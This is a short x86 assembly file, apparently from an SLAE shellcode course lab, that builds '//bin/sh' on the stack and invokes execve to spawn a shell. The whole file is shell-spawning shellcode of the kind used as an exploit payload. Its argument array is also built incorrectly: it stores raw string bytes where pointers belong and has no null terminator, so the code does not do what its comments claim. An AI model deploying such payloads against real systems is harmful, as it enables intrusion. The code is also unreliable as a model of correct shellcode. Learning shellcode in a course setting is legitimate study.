; Shellcode to exercise the SLAE execve lab
; Author: Pedro Rodrigues


global _start

section .text

_start:

	; zero-ing 3 registers in a row
 	xor ebx, ebx
 	mul ebx

 	; Setting the EBX content
	push ebx
	push 0x68732f6e
	push 0x69622f2f


	; Poiting EBX to this content
	mov ebx, esp

	; Pushing NULL to be used by EDX
	push eax

	; Poiting EDX to the NULL pointer
	mov edx, esp

	; Setting the arguments of /bin/sh through ECX
	push 0x2020736c
	push 0x20632d20

	; Setting the address of /bin/sh
	push ebx

	; Poiting ECX to this content address
	mov ecx, esp


	; Calling syscall 11 - execve
 	mov al, 0xB
 	int 0x80